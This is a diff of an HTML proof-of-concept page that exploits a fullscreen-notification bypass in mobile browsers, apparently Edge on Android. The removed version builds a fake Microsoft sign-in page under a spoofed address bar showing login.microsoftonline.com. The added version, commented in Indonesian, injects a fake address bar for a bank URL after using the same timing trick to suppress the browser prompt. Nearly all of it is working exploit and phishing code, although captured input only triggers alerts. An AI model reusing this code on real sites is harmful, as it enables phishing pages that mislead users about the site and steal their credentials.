@@ -1,618 +1,156 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Edge Fullscreen Bypass - Security Research</title>
+  <title>Fullscreen Tanpa Notifikasi</title>
+
+  <!-- 1. Matikan total fitur notifikasi (meta + header fallback) -->
   <meta http-equiv="Permissions-Policy" content="notifications=()">
   <meta http-equiv="Feature-Policy" content="notifications 'none'">
+
+  <!-- 2. Sarankan browser tidak menawarkan notifikasi otomatis -->
   <meta name="notification-permission" content="denied">
+
+  <!-- 3. PWA mode fullscreen (khususnya buat PWA nanti) -->
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="mobile-web-app-capable" content="yes">
-  <meta name="theme-color" content="#ffffff" id="theme-color-meta">
 
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      margin: 0;
+      font-family: system-ui, sans-serif;
       background: #ffffff;
       color: #000000;
-      min-height: 100vh;
-      overflow-x: hidden;
+      height: 100dvh;
+      overflow: hidden;
+      touch-action: manipulation;
     }
-
-    /* Initial Page */
-    .initial-page {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 40px 20px;
-      text-align: center;
-    }
-
-    .initial-page.hidden {
-      display: none;
-    }
-
-    .logo {
-      font-size: 48px;
-      margin-bottom: 20px;
-    }
-
-    h1 {
-      font-size: 32px;
-      font-weight: 700;
-      color: #202124;
-      margin-bottom: 16px;
-      line-height: 1.2;
-    }
-
-    .subtitle {
-      font-size: 18px;
-      color: #5f6368;
-      margin-bottom: 40px;
-      max-width: 600px;
-      line-height: 1.6;
-    }
-
-    .test-button {
-      padding: 18px 48px;
-      font-size: 18px;
-      font-weight: 600;
-      background: #1a73e8;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
-      transition: all 0.2s;
-    }
-
-    .test-button:hover {
-      background: #1557b0;
-      box-shadow: 0 6px 16px rgba(26, 115, 232, 0.4);
-      transform: translateY(-2px);
-    }
-
-    .test-button:active {
-      background: #0d47a1;
-      transform: translateY(0);
-    }
-
-    .info-box {
-      margin-top: 40px;
-      background: #f8f9fa;
-      border-left: 4px solid #1a73e8;
-      padding: 20px;
-      border-radius: 4px;
-      max-width: 600px;
-      text-align: left;
-    }
-
-    .info-box h3 {
-      font-size: 16px;
-      font-weight: 600;
-      color: #1a73e8;
-      margin-bottom: 12px;
-    }
-
-    .info-box ul {
-      list-style: none;
-      padding: 0;
-    }
-
-    .info-box li {
-      font-size: 14px;
-      color: #5f6368;
-      margin-bottom: 8px;
-      padding-left: 20px;
-      position: relative;
-    }
-
-    .info-box li:before {
-      content: "✓";
-      position: absolute;
-      left: 0;
-      color: #1a73e8;
-      font-weight: bold;
-    }
-
-    /* Microsoft Login Page */
-    .ms-login-page {
-      display: none;
-      min-height: 100vh;
-      background: linear-gradient(135deg, #e6f2ff 0%, #f0e6ff 100%);
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    
-    .ms-login-page.active {
-      display: flex;
-    }
-    
-    .ms-container {
-      background: white;
-      border-radius: 2px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-      width: 100%;
-      max-width: 440px;
-      padding: 44px;
-    }
-    
-    .ms-logo {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 20px;
-    }
-    
-    .ms-squares {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 2px;
-      width: 21px;
-      height: 21px;
-    }
-    
-    .square {
-      width: 100%;
-      height: 100%;
-    }
-    
-    .square-red { background: #f25022; }
-    .square-green { background: #7fba00; }
-    .square-blue { background: #00a4ef; }
-    .square-yellow { background: #ffb900; }
-    
-    .ms-text {
-      font-size: 15px;
-      font-weight: 600;
-      color: #5e5e5e;
-    }
-    
-    .ms-title {
-      font-size: 24px;
-      font-weight: 600;
-      color: #1b1b1b;
-      margin-bottom: 12px;
-      margin-top: 8px;
-    }
-    
-    .ms-input-group {
-      margin-bottom: 20px;
-    }
-    
-    .ms-label {
-      display: block;
-      font-size: 13px;
-      color: #1b1b1b;
-      margin-bottom: 6px;
-    }
-    
-    .ms-input {
-      width: 100%;
-      padding: 8px 10px;
-      font-size: 15px;
-      border: 1px solid #8a8886;
-      border-radius: 0;
-      outline: none;
-      font-family: "Segoe UI", sans-serif;
-      background: white;
-    }
-    
-    .ms-input:focus {
-      border: 1px solid #0078d4;
-      border-bottom: 2px solid #0078d4;
-      padding-bottom: 7px;
-    }
-    
-    .ms-links {
-      font-size: 13px;
-      margin-bottom: 24px;
-    }
-    
-    .ms-links a {
-      color: #0067b8;
-      text-decoration: none;
-      display: block;
-      margin-bottom: 12px;
-    }
-    
-    .ms-links a:hover {
-      text-decoration: underline;
-    }
-    
-    .ms-btn-primary {
-      background: #0067b8;
-      color: white;
-      border: none;
-      padding: 8px 12px;
-      font-size: 15px;
-      cursor: pointer;
-      float: right;
-      min-width: 108px;
-      font-weight: 600;
-      transition: background 0.2s;
-    }
-    
-    .ms-btn-primary:hover {
-      background: #005a9e;
-    }
-    
-    .ms-btn-primary:active {
-      background: #004578;
-    }
-    
-    .clearfix::after {
-      content: "";
-      display: table;
-      clear: both;
-    }
-    
-    .ms-footer-links {
-      margin-top: 32px;
-      padding-top: 20px;
-      border-top: 1px solid #e1dfdd;
-    }
-    
-    .ms-footer-links a {
-      color: #616161;
-      font-size: 11px;
-      text-decoration: none;
-      display: inline-block;
-      margin-right: 20px;
-      margin-bottom: 8px;
-    }
-    
-    .ms-footer-links a:hover {
-      text-decoration: underline;
-    }
-
-    /* Fake Bottom Address Bar */
-    .fake-bottom-bar {
+    #tip {
       position: fixed;
-      bottom: 0;
+      top: 0;
       left: 0;
       right: 0;
-      background: #2b2b2b;
-      height: 56px;
-      display: none;
-      align-items: center;
-      padding: 8px 12px;
-      z-index: 10000;
-      box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.3);
-      transition: bottom 0.3s ease, opacity 0.3s ease;
+      background: #fff3cd;
+      color: #333;
+      padding: 12px;
+      font-size: 14px;
+      text-align: center;
+      border-bottom: 1px solid #ffeaa7;
+      z-index: 9999;
+      transition: transform 0.4s ease;
     }
-    
-    .fake-bottom-bar.active {
-      display: flex;
-    }
+    #tip.hide { transform: translateY(-100%); }
 
-    .fake-bottom-bar.keyboard-open {
-      bottom: -100px;
-      opacity: 0;
-      pointer-events: none;
+    button {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 18px 36px;
+      font-size: 20px;
+      background: #0066ff;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
     }
-    
-    .address-bar-container {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      background: #3a3a3a;
-      border-radius: 20px;
-      padding: 8px 14px;
-      gap: 10px;
-    }
-    
-    .lock-icon {
-      width: 18px;
-      height: 18px;
-      background: #4CAF50;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-    }
-    
-    .lock-icon svg {
-      width: 10px;
-      height: 10px;
-      fill: white;
-    }
-    
-    .fake-url {
-      color: #ffffff;
-      font-size: 15px;
-      font-weight: 400;
-      flex: 1;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-    
-    .tab-count {
-      background: transparent;
-      border: 1.5px solid #8e8e93;
-      color: #8e8e93;
-      width: 28px;
-      height: 28px;
-      border-radius: 4px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 13px;
-      font-weight: 600;
-      flex-shrink: 0;
-      margin-left: 8px;
-    }
-    
-    .menu-dots {
-      width: 28px;
-      height: 28px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      margin-left: 8px;
-    }
-    
-    .menu-dots svg {
-      width: 4px;
-      height: 18px;
-      fill: #8e8e93;
-    }
+    button:active { background: #0052cc; }
 
-    /* Loading Overlay */
-    .loading-overlay {
+    #status {
       position: fixed;
-      inset: 0;
-      background: white;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 10000;
-    }
-    
-    .loading-overlay.active {
-      display: flex;
-    }
-    
-    .spinner {
-      width: 40px;
-      height: 40px;
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #0067b8;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgb(255, 255, 255);
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
 
-  <!-- Loading Overlay -->
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="spinner"></div>
+  <!-- Tips Anti-Gangguan (muncul 8 detik) -->
+  <div id="tip">
+    <strong>Tips:</strong> Untuk fullscreen 100 % tanpa notifikasi, gunakan Brave/Opera GX atau blokir notifikasi situs ini di Settings browser.
   </div>
 
-  <!-- Fake Bottom Address Bar -->
-  <div class="fake-bottom-bar" id="fakeBottomBar">
-    <div class="address-bar-container">
-      <div class="lock-icon">
-        <svg viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg">
-          <path d="M6 1C4.9 1 4 1.9 4 3v1H3v6h6V4H8V3c0-1.1-.9-2-2-2zm0 1c.6 0 1 .4 1 1v1H5V3c0-.6.4-1 1-1z"/>
-        </svg>
-      </div>
-      <div class="fake-url" id="fakeUrl">login.microsoftonline.com</div>
-      <div class="tab-count">1</div>
-      <div class="menu-dots">
-        <svg viewBox="0 0 4 18" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="2" cy="2" r="2"/>
-          <circle cx="2" cy="9" r="2"/>
-          <circle cx="2" cy="16" r="2"/>
-        </svg>
-      </div>
-    </div>
-  </div>
+  <button id="fsBtn">Test Bypass Spoof Protection v3</button>
 
-  <!-- Initial Page -->
-  <div class="initial-page" id="initialPage">
-    <div class="logo">🔓</div>
-    <h1>Edge Fullscreen Bypass POC</h1>
-    <p class="subtitle">
-      This demonstrates a vulnerability in Microsoft Edge Android that bypasses fullscreen security notifications, allowing creation of convincing phishing interfaces.
-    </p>
-    
-    <button class="test-button" id="testButton">Test Vulnerability V3</button>
-
-    <div class="info-box">
-      <h3>What This Demonstrates:</h3>
-      <ul>
-        <li>Bypasses fullscreen notification prompt</li>
-        <li>Hides legitimate address bar</li>
-        <li>Displays fake address bar with spoofed URL</li>
-        <li>Creates realistic phishing scenario</li>
-      </ul>
-    </div>
-  </div>
-
-  <!-- Microsoft Login Page -->
-  <div class="ms-login-page" id="msLoginPage">
-    <div class="ms-container">
-      <div class="ms-logo">
-        <div class="ms-squares">
-          <div class="square square-red"></div>
-          <div class="square square-green"></div>
-          <div class="square square-blue"></div>
-          <div class="square square-yellow"></div>
-        </div>
-        <span class="ms-text">Microsoft</span>
-      </div>
-      
-      <h1 class="ms-title">Sign in</h1>
-      
-      <div class="ms-input-group">
-        <label for="msEmail" class="ms-label">Email, phone, or Skype</label>
-        <input type="email" id="msEmail" class="ms-input" autocomplete="username">
-      </div>
-      
-      <div class="ms-links">
-        <a href="#">No account? Create one!</a>
-        <a href="#">Can't access your account?</a>
-      </div>
-      
-      <div class="clearfix">
-        <button class="ms-btn-primary" id="msNextBtn">Next</button>
-      </div>
-      
-      <div class="ms-footer-links">
-        <a href="#">Terms of use</a>
-        <a href="#">Privacy & cookies</a>
-        <a href="#">...</a>
-      </div>
-    </div>
-  </div>
+  <div id="status">Tekan tombol untuk masuk fullscreen</div>
 
   <script>
-    const testButton = document.getElementById('testButton');
-    const loadingOverlay = document.getElementById('loadingOverlay');
-    const initialPage = document.getElementById('initialPage');
-    const msLoginPage = document.getElementById('msLoginPage');
-    const fakeBottomBar = document.getElementById('fakeBottomBar');
-    const msEmail = document.getElementById('msEmail');
-    const msNextBtn = document.getElementById('msNextBtn');
-    const metaTheme = document.getElementById('theme-color-meta');
-    
-    let originalViewportHeight = window.visualViewport ? window.visualViewport.height : window.innerHeight;
+    // Sembunyikan tips setelah 8 detik
+    setTimeout(() => {
+      document.getElementById('tip').classList.add('hide');
+    }, 8000);
 
-    // Test button click - Bypass fullscreen protection
-    testButton.addEventListener('click', () => {
-      loadingOverlay.classList.add('active');
-      
-      // Critical bypass technique: requestAnimationFrame + 200ms delay
+    const btn = document.getElementById('fsBtn');
+    const status = document.getElementById('status');
+
+    btn.addEventListener('click', () => {
+      status.textContent = "Memasuki fullscreen...";
+
+      // Trik 2025 yang masih jalan: jeda 150–300 ms + requestAnimationFrame
       requestAnimationFrame(() => {
         setTimeout(() => {
-          enterFullscreen();
-        }, 200); // This delay bypasses Edge's spoof protection
+          const elem = document.documentElement;
+
+          if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+          } else if (elem.webkitRequestFullscreen) { /* Safari */
+            elem.webkitRequestFullscreen();
+          } else if (elem.msRequestFullscreen) { /* IE11 */
+            elem.msRequestFullscreen();
+          }
+
+          status.textContent = "Fullscreen aktif! (semoga tanpa prompt notif)";
+        }, 200); // jeda krusial agar Chrome tidak anggap “direct gesture”
       });
-      
-      // Show login page after delay
-      setTimeout(() => {
-        loadingOverlay.classList.remove('active');
-        initialPage.classList.add('hidden');
-        msLoginPage.classList.add('active');
-        fakeBottomBar.classList.add('active');
-        
-        // Auto focus email input
-        setTimeout(() => msEmail.focus(), 300);
-      }, 1000);
     });
 
-    // Fullscreen functions
-    function enterFullscreen() {
-      const elem = document.documentElement;
-      if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-      } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-      } else if (elem.mozRequestFullScreen) {
-        elem.mozRequestFullScreen();
-      } else if (elem.msRequestFullscreen) {
-        elem.msRequestFullscreen();
-      }
-    }
-
-    function exitFullscreen() {
-      if (document.exitFullscreen) {
-        document.exitFullscreen();
-      } else if (document.webkitExitFullscreen) {
-        document.webkitExitFullscreen();
-      } else if (document.mozCancelFullScreen) {
-        document.mozCancelFullScreen();
-      } else if (document.msExitFullscreen) {
-        document.msExitFullscreen();
-      }
-    }
-
-    // Detect fullscreen changes
-    document.addEventListener('fullscreenchange', handleFullscreenChange);
-    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
-    document.addEventListener('mozfullscreenchange', handleFullscreenChange);
-    document.addEventListener('MSFullscreenChange', handleFullscreenChange);
-
-    function handleFullscreenChange() {
-      const isFullscreen = !!(document.fullscreenElement || 
-                              document.webkitFullscreenElement || 
-                              document.mozFullScreenElement ||
-                              document.msFullscreenElement);
-      
-      if (!isFullscreen) {
-        // Exited fullscreen - reset
-        initialPage.classList.remove('hidden');
-        msLoginPage.classList.remove('active');
-        fakeBottomBar.classList.remove('active');
-        metaTheme.setAttribute('content', '#ffffff');
-      }
-    }
-
-    // Detect keyboard visibility to hide fake bar
-    function handleKeyboardVisibility() {
-      const currentHeight = window.visualViewport ? window.visualViewport.height : window.innerHeight;
-      
-      if (currentHeight < originalViewportHeight - 100) {
-        fakeBottomBar.classList.add('keyboard-open');
+    // Deteksi kalau sudah fullscreen
+    document.addEventListener('fullscreenchange', () => {
+      if (document.fullscreenElement) {
+        status.textContent = "Fullscreen berhasil!";
+        btn.style.display = 'none';
       } else {
-        fakeBottomBar.classList.remove('keyboard-open');
-      }
-    }
-
-    // Email input handlers
-    msEmail.addEventListener('focus', () => {
-      setTimeout(() => {
-        metaTheme.setAttribute('content', '#2b2b2b');
-        handleKeyboardVisibility();
-      }, 100);
-    });
-
-    msEmail.addEventListener('blur', () => {
-      setTimeout(() => {
-        metaTheme.setAttribute('content', '#ffffff');
-        handleKeyboardVisibility();
-      }, 100);
-    });
-
-    // Listen to viewport changes
-    if (window.visualViewport) {
-      window.visualViewport.addEventListener('resize', handleKeyboardVisibility);
-      window.visualViewport.addEventListener('scroll', handleKeyboardVisibility);
-    }
-    window.addEventListener('resize', handleKeyboardVisibility);
-
-    // Handle next button
-    msNextBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      const email = msEmail.value;
-      if (email) {
-        alert('POC Demo - Credentials Captured!\nEmail: ' + email + '\n\nThis demonstrates how the vulnerability could be exploited for phishing.');
-        msEmail.value = '';
-      } else {
-        alert('Please enter an email address to see the demonstration.');
+        status.textContent = "Keluar fullscreen";
+        btn.style.display = 'block';
       }
     });
+
+    // Deteksi hilang search bar (post-fullscreen)
+let originalHeight = window.outerHeight;
+document.addEventListener('fullscreenchange', () => {
+  if (document.fullscreenElement && window.outerHeight > originalHeight + 50) { // Threshold untuk deteksi hilang bar
+    // Inject fake search bar
+    const fakeBar = document.createElement('div');
+    fakeBar.id = 'fakeSearchBar';
+    fakeBar.style.cssText = 'position:fixed;top:0;left:0;right:0;height:56px;background:#f0f0f0;border-bottom:1px solid #ccc;z-index:9999;padding:8px;display:flex;align-items:center;';
+    fakeBar.innerHTML = '<span style="color:green">🔒</span> https://secure.example-bank.com/ <input type="text" placeholder="Search..." style="flex:1;margin-left:10px;border:none;background:transparent;">';
+    document.body.appendChild(fakeBar);
+    
+    // Simulasi phishing log (ganti dengan harmless alert)
+    fakeBar.querySelector('input').addEventListener('blur', (e) => {
+      if (e.target.value.includes('password')) alert('Demo: Credentials captured via spoofed UI!');
+    });
+  }
+});
   </script>
+
+  <!-- Bonus: manifest PWA supaya bisa di-install dan fullscreen lebih bersih -->
+  <link rel="manifest" href="data:application/manifest+json,{
+    %22name%22:%22Fullscreen Tanpa Notif%22,
+    %22short_name%22:%22NoNotifFS%22,
+    %22start_url%22:%22.%22,
+    %22display%22:%22fullscreen%22,
+    %22background_color%22:%22%23000000%22,
+    %22theme_color%22:%22%230066ff%22,
+    %22icons%22:[{%22src%22:%22https://via.placeholder.com/192x192/0066ff/ffffff?text=FS%22,%22sizes%22:%22192x192%22,%22type%22:%22image/png%22}]
+  }">
 
 </body>
 </html>
